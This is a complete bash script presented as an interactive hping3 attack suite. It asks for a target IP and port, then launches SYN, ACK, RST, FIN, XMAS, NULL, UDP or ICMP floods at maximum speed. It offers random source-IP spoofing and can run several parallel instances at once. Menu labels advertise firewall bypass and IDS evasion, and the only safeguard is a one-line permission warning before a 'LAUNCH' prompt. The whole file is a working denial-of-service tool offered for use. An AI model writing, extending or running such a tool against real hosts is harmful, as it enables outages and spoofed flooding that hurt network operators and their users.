#!/bin/bash
# ============================================================
# INTERACTIVE HPING3 TCP ATTACK SUITE
# Asks for: Attack Type, Packet Size, Threads, IP, Port, Duration
# ============================================================

# Colors for better UI
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

clear
echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}     🔥 INTERACTIVE HPING3 TCP ATTACK SUITE 🔥${NC}"
echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
echo ""

# ============================================================
# CHECK IF HPING3 IS INSTALLED
# ============================================================
if ! command -v hping3 &> /dev/null; then
    echo -e "${RED}[!] hping3 is not installed!${NC}"
    echo -e "${YELLOW}[?] Do you want to install it now? (y/n): ${NC}"
    read -r install_choice
    if [[ "$install_choice" == "y" || "$install_choice" == "Y" ]]; then
        sudo apt-get update
        sudo apt-get install hping3 -y
    else
        echo -e "${RED}[!] Cannot proceed without hping3. Exiting.${NC}"
        exit 1
    fi
fi

# ============================================================
# FUNCTION: SHOW ATTACK MENU
# ============================================================
show_attack_menu() {
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│              SELECT ATTACK TYPE                         │${NC}"
    echo -e "${CYAN}├─────────────────────────────────────────────────────────┤${NC}"
    echo -e "${CYAN}│  1. SYN Flood (Classic half-open)                       │${NC}"
    echo -e "${CYAN}│  2. ACK Flood (Firewall bypass)                         │${NC}"
    echo -e "${CYAN}│  3. SYN-ACK Flood (Amplified response)                  │${NC}"
    echo -e "${CYAN}│  4. RST Flood (Connection termination)                  │${NC}"
    echo -e "${CYAN}│  5. FIN Flood (Stealth termination)                     │${NC}"
    echo -e "${CYAN}│  6. XMAS Tree Flood (All flags - XMAS lighting)         │${NC}"
    echo -e "${CYAN}│  7. NULL Flood (No flags - IDS evasion)                 │${NC}"
    echo -e "${CYAN}│  8. UDP Flood (UDP mode)                                │${NC}"
    echo -e "${CYAN}│  9. ICMP Flood (Ping flood)                             │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────┘${NC}"
}

# ============================================================
# FUNCTION: GET FLAGS BASED ON ATTACK TYPE
# ============================================================
get_flags() {
    case $1 in
        1)
            echo "-S"  # SYN flood
            ;;
        2)
            echo "-A"  # ACK flood
            ;;
        3)
            echo "-S -A"  # SYN-ACK flood
            ;;
        4)
            echo "-R"  # RST flood
            ;;
        5)
            echo "-F"  # FIN flood
            ;;
        6)
            echo "-F -U -P"  # XMAS tree (FIN+URG+PSH)
            ;;
        7)
            echo " "  # NULL flood (no flags)
            ;;
        8)
            echo "--udp"  # UDP mode
            ;;
        9)
            echo "--icmp"  # ICMP mode
            ;;
        *)
            echo "-S"
            ;;
    esac
}

# ============================================================
# FUNCTION: GET PROTOCOL MODE FOR DISPLAY
# ============================================================
get_protocol_mode() {
    case $1 in
        8) echo "UDP" ;;
        9) echo "ICMP" ;;
        *) echo "TCP" ;;
    esac
}

# ============================================================
# MAIN INTERACTIVE LOOP
# ============================================================

while true; do
    echo ""
    echo -e "${YELLOW}════════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}                    NEW ATTACK CONFIGURATION${NC}"
    echo -e "${YELLOW}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # ============================================================
    # 1. ASK FOR TARGET IP
    # ============================================================
    echo -e "${GREEN}[?] Enter target IP address:${NC}"
    echo -e "${CYAN}    (e.g., 192.168.1.100 or example.com)${NC}"
    read -p "└─> " TARGET_IP
    
    if [[ -z "$TARGET_IP" ]]; then
        echo -e "${RED}[!] No IP provided. Exiting.${NC}"
        exit 1
    fi
    
    # ============================================================
    # 2. ASK FOR TARGET PORT
    # ============================================================
    echo ""
    echo -e "${GREEN}[?] Enter target port:${NC}"
    echo -e "${CYAN}    (1-65535, common: 80=HTTP, 443=HTTPS, 22=SSH, 0=random)${NC}"
    read -p "└─> " TARGET_PORT
    
    if [[ -z "$TARGET_PORT" ]]; then
        TARGET_PORT="80"
        echo -e "${YELLOW}[!] No port specified, using default: 80${NC}"
    fi
    
    # ============================================================
    # 3. SHOW AND ASK FOR ATTACK TYPE
    # ============================================================
    echo ""
    show_attack_menu
    echo ""
    echo -e "${GREEN}[?] Select attack type (1-9):${NC}"
    read -p "└─> " ATTACK_TYPE
    
    if [[ -z "$ATTACK_TYPE" ]]; then
        ATTACK_TYPE="1"
        echo -e "${YELLOW}[!] No attack selected, using default: 1 (SYN Flood)${NC}"
    fi
    
    FLAGS=$(get_flags $ATTACK_TYPE)
    PROTOCOL_MODE=$(get_protocol_mode $ATTACK_TYPE)
    
    # ============================================================
    # 4. ASK FOR PACKET SIZE
    # ============================================================
    echo ""
    echo -e "${GREEN}[?] Enter packet size (bytes):${NC}"
    echo -e "${CYAN}    (0=default header only, 64-65507 max, 1400 is common)${NC}"
    read -p "└─> " PACKET_SIZE
    
    if [[ -z "$PACKET_SIZE" ]]; then
        PACKET_SIZE="0"
        echo -e "${YELLOW}[!] No size specified, using default: 0${NC}"
    fi
    
    # ============================================================
    # 5. ASK FOR DURATION/COUNT
    # ============================================================
    echo ""
    echo -e "${GREEN}[?] How many packets to send? (0 = unlimited/flood mode)${NC}"
    echo -e "${CYAN}    (e.g., 1000, 50000, or 0 for flood)${NC}"
    read -p "└─> " PACKET_COUNT
    
    if [[ -z "$PACKET_COUNT" ]]; then
        PACKET_COUNT="0"
        echo -e "${YELLOW}[!] No count specified, using flood mode (0)${NC}"
    fi
    
    # ============================================================
    # 6. ASK FOR INTERVAL/SPEED
    # ============================================================
    echo ""
    echo -e "${GREEN}[?] Select speed mode:${NC}"
    echo -e "${CYAN}    1. Normal (1 second between packets)${NC}"
    echo -e "${CYAN}    2. Fast (--fast = 10 packets/sec)${NC}"
    echo -e "${CYAN}    3. Faster (--faster = 1000 packets/sec)${NC}"
    echo -e "${CYAN}    4. FLOOD (--flood = MAXIMUM SPEED) 🔥${NC}"
    echo -e "${CYAN}    5. Custom interval (microseconds)${NC}"
    read -p "└─> " SPEED_MODE
    
    case $SPEED_MODE in
        1) SPEED="" ;;
        2) SPEED="--fast" ;;
        3) SPEED="--faster" ;;
        4) SPEED="--flood" ;;
        5) 
            echo -e "${GREEN}[?] Enter interval in microseconds (e.g., u1000 = 1ms):${NC}"
            read -p "└─> " CUSTOM_INTERVAL
            SPEED="-i $CUSTOM_INTERVAL"
            ;;
        *) SPEED="--flood" ;;
    esac
    
    # ============================================================
    # 7. ASK FOR SPOOFING / RANDOM SOURCE
    # ============================================================
    echo ""
    echo -e "${GREEN}[?] Enable IP spoofing (random source IP)? (y/n)${NC}"
    echo -e "${CYAN}    (--rand-source sends packets from random IPs)${NC}"
    read -p "└─> " SPOOF_CHOICE
    
    if [[ "$SPOOF_CHOICE" == "y" || "$SPOOF_CHOICE" == "Y" ]]; then
        SPOOF="--rand-source"
        echo -e "${YELLOW}[!] WARNING: Spoofed packets may be filtered by some networks${NC}"
    else
        SPOOF=""
    fi
    
    # ============================================================
    # 8. ASK FOR VERBOSE OUTPUT
    # ============================================================
    echo ""
    echo -e "${GREEN}[?] Show verbose output? (y/n)${NC}"
    echo -e "${CYAN}    (Verbose shows reply details, quiet shows only stats)${NC}"
    read -p "└─> " VERBOSE_CHOICE
    
    if [[ "$VERBOSE_CHOICE" == "y" || "$VERBOSE_CHOICE" == "Y" ]]; then
        VERBOSE="-V"
    else
        VERBOSE="-q"
    fi
    
    # ============================================================
    # 9. ASK FOR NETWORK INTERFACE
    # ============================================================
    echo ""
    echo -e "${GREEN}[?] Network interface (leave blank for auto):${NC}"
    echo -e "${CYAN}    (e.g., eth0, wlan0, ens33)${NC}"
    read -p "└─> " INTERFACE
    
    if [[ -n "$INTERFACE" ]]; then
        IFACE="-I $INTERFACE"
    else
        IFACE=""
    fi
    
    # ============================================================
    # 10. ASK FOR THREADS/MULTIPLE INSTANCES
    # ============================================================
    echo ""
    echo -e "${GREEN}[?] Number of parallel hping3 instances (threads/processes):${NC}"
    echo -e "${CYAN}    (1 = single, 2-8 = multiple for multi-core performance)${NC}"
    read -p "└─> " THREAD_COUNT
    
    if [[ -z "$THREAD_COUNT" || "$THREAD_COUNT" -lt 1 ]]; then
        THREAD_COUNT="1"
    fi
    
    # ============================================================
    # SHOW CONFIGURATION SUMMARY
    # ============================================================
    echo ""
    echo -e "${YELLOW}════════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}                    ATTACK CONFIGURATION${NC}"
    echo -e "${YELLOW}════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  Target IP      :${NC} $TARGET_IP"
    echo -e "${CYAN}  Target Port    :${NC} $TARGET_PORT"
    echo -e "${CYAN}  Attack Type    :${NC} $ATTACK_TYPE ($PROTOCOL_MODE)"
    echo -e "${CYAN}  Flags          :${NC} ${FLAGS:-"(none - NULL flood)"}"
    echo -e "${CYAN}  Packet Size    :${NC} $PACKET_SIZE bytes"
    echo -e "${CYAN}  Packet Count   :${NC} ${PACKET_COUNT:-0} ${PACKET_COUNT:-0} (0=unlimited)"
    echo -e "${CYAN}  Speed          :${NC} ${SPEED:-"default (1 second interval)"}"
    echo -e "${CYAN}  Spoofing       :${NC} ${SPOOF:-"OFF"}"
    echo -e "${CYAN}  Verbose        :${NC} ${VERBOSE:-"-q"}"
    echo -e "${CYAN}  Interface      :${NC} ${INTERFACE:-"auto"}"
    echo -e "${CYAN}  Parallel Instances:${NC} $THREAD_COUNT"
    echo -e "${YELLOW}════════════════════════════════════════════════════════════${NC}"
    
    # ============================================================
    # CONFIRM BEFORE LAUNCH
    # ============================================================
    echo ""
    echo -e "${RED}[⚠️] WARNING: Only attack systems you own or have permission to test!${NC}"
    echo -e "${GREEN}[?] Type 'LAUNCH' to start the attack:${NC}"
    read -p "└─> " CONFIRM
    
    if [[ "$CONFIRM" != "LAUNCH" ]]; then
        echo -e "${YELLOW}[x] Aborted. Type 'YES' to run another attack or 'EXIT' to quit.${NC}"
        read -p "Try again? (YES/EXIT): " AGAIN
        if [[ "$AGAIN" == "EXIT" ]]; then
            echo -e "${RED}[!] Exiting.${NC}"
            exit 0
        fi
        continue
    fi
    
    # ============================================================
    # BUILD AND EXECUTE COMMAND
    # ============================================================
    echo ""
    echo -e "${RED}[*] LAUNCHING ATTACK with $THREAD_COUNT parallel instances...${NC}"
    echo -e "${RED}[*] Press Ctrl+C to stop${NC}"
    echo ""
    
    # Build base command
    if [[ "$PACKET_COUNT" == "0" ]]; then
        # Unlimited mode (keep running until Ctrl+C)
        BASE_CMD="sudo hping3 $FLAGS $SPEED $VERBOSE $SPOOF $IFACE -p $TARGET_PORT -d $PACKET_SIZE $TARGET_IP"
    else
        # Limited count mode
        BASE_CMD="sudo hping3 -c $PACKET_COUNT $FLAGS $SPEED $VERBOSE $SPOOF $IFACE -p $TARGET_PORT -d $PACKET_SIZE $TARGET_IP"
    fi
    
    echo -e "${CYAN}[Command] $BASE_CMD${NC}"
    echo -e "${CYAN}[Running with $THREAD_COUNT instances...]${NC}"
    echo ""
    
    # Launch multiple instances in background
    PIDS=()
    for ((i=1; i<=THREAD_COUNT; i++)); do
        echo -e "${GREEN}[+] Launching instance $i/$THREAD_COUNT${NC}"
        eval "$BASE_CMD" &
        PIDS+=($!)
        sleep 0.1  # Small delay to prevent startup collision
    done
    
    echo ""
    echo -e "${YELLOW}[*] All $THREAD_COUNT instances running.${NC}"
    echo -e "${YELLOW}[*] Process IDs: ${PIDS[*]}${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop all instances${NC}"
    
    # Wait for all processes
    for pid in "${PIDS[@]}"; do
        wait $pid 2>/dev/null
    done
    
    echo ""
    echo -e "${GREEN}[✓] Attack complete!${NC}"
    
    # ============================================================
    # ASK TO RUN AGAIN
    # ============================================================
    echo ""
    echo -e "${GREEN}[?] Run another attack? (y/n)${NC}"
    read -p "└─> " RUN_AGAIN
    
    if [[ "$RUN_AGAIN" != "y" && "$RUN_AGAIN" != "Y" ]]; then
        echo -e "${RED}[!] Exiting.${NC}"
        exit 0
    fi
done
